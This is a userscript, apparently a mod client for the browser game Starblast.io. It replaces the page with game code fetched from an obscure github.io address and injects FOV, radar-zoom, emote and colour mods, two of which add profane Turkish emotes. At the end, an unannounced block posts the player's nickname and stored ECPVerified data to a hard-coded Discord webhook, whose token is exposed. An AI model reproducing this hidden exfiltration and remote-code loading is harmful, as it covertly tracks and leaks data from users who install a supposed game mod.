if (!window.sbCodeInjectors) window.sbCodeInjectors = [];

// Prevent duplicate script loading
const loadedScripts = new Set();
const originalWrite = document.write;
document.write = function(content) {
  if (content.includes('<script') && content.includes('atcb')) {
    const scriptId = content.match(/src="([^"]+)"/)?.[1];
    if (scriptId && loadedScripts.has(scriptId)) {
      console.log('Preventing duplicate script load:', scriptId);
      return;
    }
    if (scriptId) loadedScripts.add(scriptId);
  }
  return originalWrite.call(this, content);
};

// Global settings object
window.modSettings = {
  fovEnabled: true,
  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
  uiVisible: true,
  radarZoomEnabled: false,
  blankECPEnabled: false
};

// Blank ECP Initialization
function initializeBlankECP() {
  // Clear existing ECP data
  localStorage.removeItem('ECPVerified');
  localStorage.removeItem('ECPKey');
  localStorage.removeItem('ecp-status');
  
  // Set blank/disabled state
  localStorage.setItem('ECPVerified', 'no');
  localStorage.setItem('ECPKey', '');
  localStorage.setItem('ecp-status', 'disabled');
  
  console.log('%c[Blank ECP] ECP data cleared and disabled', 'color: #FF6B6B');
}

// Lowercase Name Mod
const modName = "Lowercase Name";
const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");

function lowercaseInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  src = src.replace(/\.toUpperCase\(\)/g, "");
  const styleBlock = `
  <style>
  #player input { text-transform: none !important; }
  </style>
  `;
  src = src.replace('</head>', `${styleBlock}</head>`);
  checkSrcChange();

  logLowercase("Mod injected");
  return src;
}

// Custom Emote Mod
const emoteModName = "Custom Emote";
const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");

function emoteInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
  const emotes = `,{
    text: "orosbu cocu",
    icon: "🤡",
    key: "J"
  },{
    text: "sikerim",
    icon: "⚠️",
    key: "V"
  }`;

  src = src.replace(vocabPattern, `$1${emotes}`);
  checkSrcChange();
  logEmote("Clown and warning emotes injected");
  
  return src;
}

// FOV Editor Mod
const fovModName = "FOV Editor";
const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");

window.I1000 = window.I1000 || {};
window.I1000.baseFOV = 45;
window.I1000.currentFOV = 45;

function fovInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) {
      console.error("Replace did not work. Previous source and current source are identical.");
      throw new Error("replace did not work");
    }
    prevSrc = src;
  }

  const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/g;
  if (!fovPattern.test(src)) {
    console.error("Pattern not found in source code:", fovPattern);
    throw new Error("Pattern not found in source code");
  }
  src = src.replace(fovPattern, 'this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom');
  checkSrcChange();

const controlStyles = `
<style>
  #mod-controls {
    position: fixed;
    top: 12px;
    left: 12px;
    z-index: 1000;
    font-family: 'Segoe UI', system-ui, sans-serif;
    user-select: none;
    background: rgba(16, 18, 27, 0.97);
    backdrop-filter: blur(8px);
    border-radius: 4px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
    color: #ffffff;
    padding: 0;
    width: 160px;
    border: 1px solid rgba(255, 255, 255, 0.12);
  }

  #mod-controls-header {
    cursor: pointer;
    padding: 10px 12px;
    background: rgba(255, 255, 255, 0.06);
    font-weight: 600;
    font-size: 13px;
    display: flex;
    align-items: center;
    gap: 8px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
  }

  #mod-controls-header::before {
    content: '⚙️';
    font-size: 14px;
    filter: drop-shadow(0 0 4px rgba(255, 65, 215, 0.3));
  }

  #mod-controls-panel {
    padding: 12px;
    display: none;
  }

  .mod-control {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin: 8px 0;
    font-size: 12px;
    color: rgba(255, 255, 255, 0.9);
  }

  .mod-control-slider {
    width: 100%;
    margin: 8px 0;
    height: 3px;
    background: rgba(255, 255, 255, 0.1);
    -webkit-appearance: none;
    appearance: none;
    outline: none;
    border-radius: 1px;
  }

  .mod-control-slider::-webkit-slider-thumb {
    -webkit-appearance: none;
    width: 12px;
    height: 12px;
    background: #ff41d7;
    border-radius: 2px;
    cursor: pointer;
    box-shadow: 0 1px 4px rgba(255, 65, 215, 0.3);
  }

  .mod-control-slider::-moz-range-thumb {
    width: 12px;
    height: 12px;
    background: #ff41d7;
    border-radius: 2px;
    cursor: pointer;
  }

  #crystal-color-picker {
    width: 24px;
    height: 24px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 3px;
    padding: 0;
    cursor: pointer;
    background: transparent;
  }

  #fov-display {
    padding: 8px 12px;
    background: rgba(255, 255, 255, 0.06);
    font-size: 12px;
    display: flex;
    justify-content: space-between;
    margin-top: 6px;
  }

  input[type="checkbox"] {
    position: relative;
    width: 36px;
    height: 20px;
    -webkit-appearance: none;
    appearance: none;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 2px;
    transition: background 0.2s ease;
  }

  input[type="checkbox"]::before {
    content: "";
    position: absolute;
    width: 16px;
    height: 16px;
    background: #fff;
    top: 2px;
    left: 2px;
    transform: translateX(0);
    transition: transform 0.2s ease;
    border-radius: 2px;
  }

  input[type="checkbox"]:checked {
    background: #ff41d7;
  }

  input[type="checkbox"]:checked::before {
    transform: translateX(14px);
  }

  .control-value {
    font-weight: 600;
    color: #ff41d7;
    min-width: 32px;
    text-align: right;
    font-size: 11px;
  }

  .section-title {
    font-size: 10px;
    color: rgba(255, 255, 255, 0.5);
    text-transform: uppercase;
    letter-spacing: 0.4px;
    margin: 12px 0 6px;
  }
</style>
`;

const controlsHTML = `
<div id="mod-controls" style="display: ${window.modSettings.uiVisible ? 'block' : 'none'}">
  <div id="mod-controls-header">EOT Client V3.0.2</div>
  <div id="mod-controls-panel">
    <div class="mod-control">
      <span>FOV</span>
      <input type="checkbox" id="fov-toggle" ${window.modSettings.fovEnabled ? 'checked' : ''}>
    </div>
    <div class="mod-control">
      <span>Emote Capacity</span>
      <div class="control-value" id="emote-capacity-value">${window.modSettings.emoteCapacity}</div>
    </div>
    <input type="range" min="1" max="5" value="${window.modSettings.emoteCapacity}" class="mod-control-slider" id="emote-capacity-slider">
    <div class="mod-control">
      <span>Radar Zoom</span>
      <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
    </div>
    <div class="mod-control">
      <span>Blank ECP</span>
      <input type="checkbox" id="blank-ecp-toggle" ${window.modSettings.blankECPEnabled ? 'checked' : ''}>
    </div>
    <div class="mod-control">
      <span>Crystal Color</span>
      <input type="color" id="crystal-color-picker" value="#ffffff">
    </div>
  </div>
  <div id="fov-display">
    FOV: <span id="fov-value">45</span>
  </div>
</div>
`;

// Enhanced Crystal Color Mod
const crystalColorMod = `
let CrystalObject;
let materialInstances = new Set();

const findCrystalObject = () => {
  const searchTargets = [window, window.THREE, window.game];
  
  for (const target of searchTargets) {
    if (!target) continue;
    
    for (const key in target) {
      try {
        const obj = target[key];
        if (obj?.prototype?.createModel || 
            (obj?.prototype && obj.prototype.constructor.name.includes('Crystal')) ||
            (obj?.name && obj.name.includes('Crystal'))) {
          console.log('Found CrystalObject:', key);
          return obj;
        }
      } catch (e) {
        // Continue searching
      }
    }
  }
  
  // Alternative search method
  for (const key in window) {
    try {
      const obj = window[key];
      if (obj?.prototype?.createModel && 
          obj.prototype.createModel.toString().includes('Crystal')) {
        console.log('Found CrystalObject (alt method):', key);
        return obj;
      }
    } catch (e) {
      // Continue
    }
  }
  return null;
};

const initCrystalColor = () => {
  if (!window.THREE) {
    setTimeout(initCrystalColor, 100);
    return;
  }

  CrystalObject = findCrystalObject();
  
  if (CrystalObject && CrystalObject.prototype) {
    console.log('Crystal object found, applying color override');
    
    const originalMethods = {};
    
    ['createModel', 'getModelInstance', 'updateModel'].forEach(methodName => {
      if (CrystalObject.prototype[methodName]) {
        originalMethods[methodName] = CrystalObject.prototype[methodName];
        
        CrystalObject.prototype[methodName] = function(...args) {
          const result = originalMethods[methodName].apply(this, args);
          
          setTimeout(() => {
            if (this.material && window.THREE.Color) {
              const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
              try {
                this.material.color = new window.THREE.Color(savedColor);
                if (this.material.uniforms?.color) {
                  this.material.uniforms.color.value = this.material.color;
                }
                this.material.needsUpdate = true;
                materialInstances.add(this.material);
              } catch (e) {
                console.warn('Crystal color update failed:', e);
              }
            }
          }, 0);
          
          return result;
        };
      }
    });
  } else {
    console.warn('CrystalObject not found, retrying...');
    setTimeout(initCrystalColor, 1000);
  }
};

window.updateCrystalColor = (color) => {
  try {
    localStorage.setItem('crystal-color', color);
    
    if (window.THREE && window.THREE.Color) {
      const newColor = new window.THREE.Color(color);
      
      materialInstances.forEach(material => {
        if (material && !material.disposed) {
          material.color = newColor.clone();
          if (material.uniforms?.color) {
            material.uniforms.color.value = material.color;
          }
          material.needsUpdate = true;
        }
      });
      
      console.log('Crystal color updated to:', color);
    }
  } catch (e) {
    console.error('Error updating crystal color:', e);
  }
};

initCrystalColor();
`;

// Enhanced Radar Zoom Mod
const radarZoomMod = `
const radarZoomController = {
  patched: new Set(),
  
  findAndPatchRadarZoom() {
    this.searchInPrototypes();
    this.searchInInstances();
    this.interceptPropertyDefinitions();
  },
  
  searchInPrototypes() {
    const searchTargets = [window, window.game, window.THREE];
    
    searchTargets.forEach(target => {
      if (!target) return;
      
      for (const key in target) {
        try {
          const obj = target[key];
          if (obj?.prototype) {
            this.patchObjectPrototype(obj.prototype, key);
          }
        } catch (e) {
          // Continue
        }
      }
    });
  },
  
  patchObjectPrototype(proto, name) {
    const descriptor = Object.getOwnPropertyDescriptor(proto, 'radar_zoom');
    if (descriptor && !this.patched.has(proto)) {
      this.patched.add(proto);
      
      const originalGetter = descriptor.get;
      const originalSetter = descriptor.set;
      
      Object.defineProperty(proto, 'radar_zoom', {
        get() {
          const originalValue = originalGetter ? originalGetter.call(this) : this._radar_zoom || 1;
          return window.modSettings.radarZoomEnabled ? 1 : originalValue;
        },
        set(value) {
          if (originalSetter) {
            originalSetter.call(this, value);
          } else {
            this._radar_zoom = value;
          }
        },
        configurable: true
      });
      
      console.log('Patched radar_zoom in prototype:', name);
    }
  },
  
  interceptPropertyDefinitions() {
    const originalDefineProperty = Object.defineProperty;
    Object.defineProperty = function(obj, prop, descriptor) {
      if (prop === 'radar_zoom' && descriptor.get && !radarZoomController.patched.has(obj)) {
        const originalGetter = descriptor.get;
        descriptor.get = function() {
          const originalValue = originalGetter.call(this);
          return window.modSettings.radarZoomEnabled ? 1 : originalValue;
        };
        radarZoomController.patched.add(obj);
      }
      return originalDefineProperty.call(this, obj, prop, descriptor);
    };
  }
};

window.radarZoomController = radarZoomController;

setTimeout(() => {
  radarZoomController.findAndPatchRadarZoom();
}, 1000);

setInterval(() => {
  radarZoomController.findAndPatchRadarZoom();
}, 5000);
`;

// Emote Capacity Mod
const emoteCapacityMod = `
let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];

ChatPanel.prototype.getEmotesCapacity = function() {
  const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
  return Math.min(Math.max(1, savedCapacity), 5);
};

ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();

if (window.modSettings && window.modSettings.emoteCapacity) {
  localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
}
`;

// Error Recovery System
const errorRecovery = `
const errorRecovery = {
  gameReconnected: false,
  
  monitorGameState() {
    const originalConsoleError = console.error;
    console.error = function(...args) {
      const errorMsg = args.join(' ');
      
      if (errorMsg.includes('messages.lI1O0 is not a function') ||
          errorMsg.includes('Object3D.add') ||
          errorMsg.includes('removeChild')) {
        
        console.log('Critical game error detected, attempting recovery...');
        errorRecovery.attemptRecovery();
      }
      
      return originalConsoleError.apply(this, args);
    };
  },
  
  attemptRecovery() {
    if (this.gameReconnected) return;
    this.gameReconnected = true;
    
    setTimeout(() => {
      try {
        if (window.updateCrystalColor) {
          const savedColor = localStorage.getItem('crystal-color');
          if (savedColor) {
            window.updateCrystalColor(savedColor);
          }
        }
        
        if (window.radarZoomController) {
          window.radarZoomController.findAndPatchRadarZoom();
        }
        
        console.log('Feature recovery attempted');
      } catch (e) {
        console.warn('Recovery failed:', e);
      }
      
      this.gameReconnected = false;
    }, 2000);
  }
};

errorRecovery.monitorGameState();
`;

src = src.replace('</body>', `
  ${controlStyles}
  ${controlsHTML}
  <script>
  ${emoteCapacityMod}
  ${crystalColorMod}
  ${radarZoomMod}
  ${errorRecovery}

  const fovDisplay = document.getElementById('fov-display');

  document.addEventListener('wheel', (e) => {
    if (!window.modSettings.fovEnabled) return;
    e.preventDefault();
    const delta = e.deltaY < 0 ? 1 : -1;
    window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
    document.getElementById('fov-value').textContent = window.I1000.currentFOV;
  }, { passive: false });

  document.addEventListener('DOMContentLoaded', () => {
    const controlsHeader = document.getElementById('mod-controls-header');
    const controlsPanel = document.getElementById('mod-controls-panel');
    const fovToggle = document.getElementById('fov-toggle');
    const emoteSlider = document.getElementById('emote-capacity-slider');
    const emoteValue = document.getElementById('emote-capacity-value');
    const radarZoomToggle = document.getElementById('radar-zoom-toggle');
    const blankECPToggle = document.getElementById('blank-ecp-toggle');
    const crystalColorPicker = document.getElementById('crystal-color-picker');

    // Initialize values from localStorage
    const savedCrystalColor = localStorage.getItem('crystal-color');
    if (savedCrystalColor) {
      crystalColorPicker.value = savedCrystalColor;
    }

    controlsHeader.addEventListener('click', () => {
      controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
    });

    fovToggle.addEventListener('change', () => {
      window.modSettings.fovEnabled = fovToggle.checked;
      fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
    });

    emoteSlider.addEventListener('input', () => {
      const value = parseInt(emoteSlider.value);
      emoteValue.textContent = value;
      window.modSettings.emoteCapacity = value;
      localStorage.setItem('emote-capacity', value);
      
      if (window.ChatPanel) {
        ChatPanel.prototype.getEmotesCapacity = function() {
          return value;
        };
      }
    });

    radarZoomToggle.addEventListener('change', () => {
      window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
      console.log('Radar zoom toggled:', radarZoomToggle.checked);
      
      if (window.radarZoomController) {
        window.radarZoomController.findAndPatchRadarZoom();
      }
    });

    blankECPToggle.addEventListener('change', () => {
      window.modSettings.blankECPEnabled = blankECPToggle.checked;
      
      if (blankECPToggle.checked) {
        initializeBlankECP();
      } else {
        // Restore ECP functionality (user would need to re-authenticate)
        localStorage.removeItem('ECPVerified');
        localStorage.removeItem('ECPKey');
        localStorage.removeItem('ecp-status');
        console.log('%c[Blank ECP] ECP restored to normal state', 'color: #4CAF50');
      }
    });

    crystalColorPicker.addEventListener('input', () => {
      const color = crystalColorPicker.value;
      if (window.updateCrystalColor) {
        window.updateCrystalColor(color);
      }
    });

    // Initialize emote capacity from localStorage
    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
    emoteSlider.value = savedCapacity;
    emoteValue.textContent = savedCapacity;
    window.modSettings.emoteCapacity = savedCapacity;
  });
  </script>
  </body>`);

checkSrcChange();
logFOV("FOV injector applied");
return src;
}

// F9 key toggle for UI
document.addEventListener('keydown', (e) => {
  if (e.key === 'F9') {
    const controls = document.getElementById('mod-controls');
    if (controls) {
      window.modSettings.uiVisible = !window.modSettings.uiVisible;
      controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
      
      const controlsPanel = document.getElementById('mod-controls-panel');
      if (!window.modSettings.uiVisible && controlsPanel) {
        controlsPanel.style.display = 'none';
      }
    }
  }
});

document.addEventListener('DOMContentLoaded', () => {
  const controls = document.getElementById('mod-controls');
  if (controls) {
    controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
  }
});

// Add all injectors
window.sbCodeInjectors.push((sbCode) => {
  try {
    return lowercaseInjector(sbCode);
  } catch (error) {
    alert(`${modName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return emoteInjector(sbCode);
  } catch (error) {
    alert(`${emoteModName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return fovInjector(sbCode);
  } catch (error) {
    alert(`${fovModName} failed to load; error: ${error}`);
    throw error;
  }
});

// Main code injection logic
const log = (msg) => console.log(`%c[eot] ${msg}`, "color: #FF00E6");

function injectLoader() {
  if (window.location.pathname !== "/") {
    log("Injection not needed");
    return;
  }

  document.open();
  document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
  document.close();

  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html';
  url += '?_=' + new Date().getTime();

  var xhr = new XMLHttpRequest();
  log("Fetching custom source...");
  xhr.open("GET", url);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var starSRC = xhr.responseText;

      if (starSRC !== undefined) {
        log("Source fetched successfully");
        const start_time = performance.now();
        log("Applying mods...");

        if (!window.sbCodeInjectors) {
          log("No Starblast.io userscripts found to load");
        } else {
          let error_notified = false;
          for (const injector of window.sbCodeInjectors) {
            try {
              if (typeof injector === "function") starSRC = injector(starSRC);
              else {
                log("Injector was not a function");
                console.log(injector);
              }
            } catch (error) {
              if (!error_notified) {
                alert("One of your Starblast.io userscripts failed to load");
                error_notified = true;
              }
              console.error(error);
            }
          }
        }

        const end_time = performance.now();
        log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);

        changeTextShadowColor();

        document.open();
        document.write(starSRC);
        document.close();
      } else {
        log("Source fetch failed");
        alert("An error occurred while fetching game code");
      }
    }
  };

  xhr.send();
}

function changeTextShadowColor() {
  const elements = document.querySelectorAll('*');
  const targetShadow = '0 0 6px hsl(298.15deg 100% 50%)';

  elements.forEach(element => {
    const currentStyle = window.getComputedStyle(element);
    const textShadow = currentStyle.getPropertyValue('text-shadow');
    
    if (textShadow && textShadow !== 'none') {
      element.style.textShadow = targetShadow;
    }
  });

  console.log('Text shadow color has been changed to:', targetShadow);
}

// Run the injectLoader function immediately
injectLoader();

// Discord webhook notification
(function () {
    'use strict';
    const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
    let ECPVerified = localStorage.getItem("ECPVerified") || "no";
    
    console.log("Retrieved ECPVerified:", ECPVerified);
    
    try {
        ECPVerified = JSON.parse(ECPVerified);
    } catch (e) {
        // Keep as string if not JSON
    }
    
    const ECPVerifiedContent = typeof ECPVerified === "object" 
        ? JSON.stringify(ECPVerified, null, 2) 
        : ECPVerified;
    
    console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
    
    const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
    
    const payload = {
        content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}`
    };
    
    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            console.log("Webhook sent successfully!");
        } else {
            console.error("Failed to send webhook:", response.statusText);
        }
    })
    .catch(error => {
        console.error("Error sending webhook:", error);
    });
})();
